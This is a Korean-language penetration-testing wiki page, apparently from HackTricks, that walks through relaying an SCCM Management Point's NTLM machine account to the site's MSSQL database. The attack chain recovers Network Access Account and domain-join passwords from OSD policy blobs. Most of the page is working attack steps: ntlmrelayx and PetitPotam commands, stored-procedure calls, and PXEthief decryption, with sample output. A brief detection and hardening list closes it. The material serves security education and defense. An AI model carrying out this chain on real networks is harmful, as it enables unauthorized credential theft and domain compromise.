# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
**System Center Configuration Manager (SCCM) Management Point (MP)**가 SMB/RPC를 통해 인증하도록 강제하고 그 NTLM 머신 계정을 **사이트 데이터베이스 (MSSQL)**에 **중계**하면 `smsdbrole_MP` / `smsdbrole_MPUserSvc` 권한을 얻습니다. 이 역할은 **운영 체제 배포 (OSD)** 정책 블롭(네트워크 액세스 계정 자격 증명, 작업 시퀀스 변수 등)을 노출하는 일련의 저장 프로시저를 호출할 수 있게 해줍니다. 블롭은 16진수로 인코딩/암호화되어 있지만 **PXEthief**를 사용하여 디코딩 및 복호화할 수 있어 평문 비밀을 얻을 수 있습니다.

고수준 체인:
1. MP 및 사이트 DB 발견 ↦ 인증되지 않은 HTTP 엔드포인트 `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks` 시작.
3. **PetitPotam**, PrinterBug, DFSCoerce 등을 사용하여 MP 강제.
4. SOCKS 프록시를 통해 `mssqlclient.py -windows-auth`로 중계된 **<DOMAIN>\\<MP-host>$** 계정으로 연결.
5. 실행:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (또는 `MP_GetPolicyBodyAfterAuthorization`)
6. `0xFFFE` BOM 제거, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

`OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password` 등의 비밀이 PXE나 클라이언트에 손대지 않고 복구됩니다.

---

## 1. 인증되지 않은 MP 엔드포인트 열거
MP ISAPI 확장 **GetAuth.dll**은 인증이 필요 없는 여러 매개변수를 노출합니다(사이트가 PKI 전용이 아닌 경우):

| 매개변수 | 목적 |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | 사이트 서명 인증서 공개 키 + *x86* / *x64* **모든 알 수 없는 컴퓨터** 장치의 GUID를 반환합니다. |
| `MPLIST` | 사이트의 모든 관리 지점을 나열합니다. |
| `SITESIGNCERT` | 기본 사이트 서명 인증서를 반환합니다(LDAP 없이 사이트 서버 식별). |

나중에 DB 쿼리를 위해 **clientID** 역할을 할 GUID를 가져옵니다:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. MP 머신 계정을 MSSQL로 릴레이하기
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
강제 조작이 발생하면 다음과 같은 내용을 볼 수 있어야 합니다:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. 저장 프로시저를 통해 OSD 정책 식별
SOCKS 프록시를 통해 연결 (기본 포트 1080):
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
**CM_<SiteCode>** DB로 전환합니다(3자리 사이트 코드를 사용합니다, 예: `CM_001`).

### 3.1 알 수 없는 컴퓨터 GUID 찾기 (선택 사항)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2 할당된 정책 목록
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
각 행은 `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`을 포함합니다.

정책에 집중하세요:
* **NAAConfig**  – 네트워크 액세스 계정 자격 증명
* **TS_Sequence** – 작업 시퀀스 변수 (OSDJoinAccount/Password)
* **CollectionSettings** – 실행 계정을 포함할 수 있습니다.

### 3.3 전체 본문 검색
이미 `PolicyID` 및 `PolicyVersion`이 있는 경우, 다음을 사용하여 clientID 요구 사항을 건너뛸 수 있습니다:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> 중요: SSMS에서 “가져온 최대 문자 수”를 증가시키십시오 (>65535) 그렇지 않으면 blob이 잘립니다.

---

## 4. blob 디코드 및 복호화
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
복구된 비밀 예:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. 관련 SQL 역할 및 절차
릴레이 시 로그인은 다음에 매핑됩니다:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

이 역할은 수십 개의 EXEC 권한을 노출하며, 이 공격에 사용되는 주요 권한은 다음과 같습니다:

| 저장 프로시저 | 목적 |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | `clientID`에 적용된 정책 목록. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | 전체 정책 본문 반환. |
| `MP_GetListOfMPsInSiteOSD` | `MPKEYINFORMATIONMEDIA` 경로에 의해 반환됨. |

전체 목록을 확인할 수 있습니다:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. 탐지 및 강화
1. **MP 로그인 모니터링** – 호스트가 아닌 IP에서 로그인하는 모든 MP 컴퓨터 계정 ≈ 릴레이.
2. 사이트 데이터베이스에서 **인증을 위한 확장 보호 (EPA)** 활성화 (`PREVENT-14`).
3. 사용하지 않는 NTLM 비활성화, SMB 서명 강제, RPC 제한 (
`PetitPotam`/`PrinterBug`에 대해 사용된 동일한 완화 조치).
4. IPSec / 상호 TLS로 MP ↔ DB 통신 강화.

---

## 참조
* NTLM 릴레이 기본 사항:
{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL 남용 및 사후 활용:
{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## 참고 문헌
- [귀하의 관리자와 이야기하고 싶습니다: 관리 포인트 릴레이로 비밀 훔치기](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [구성 오류 관리자 – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
{{#include ../../banners/hacktricks-training.md}}
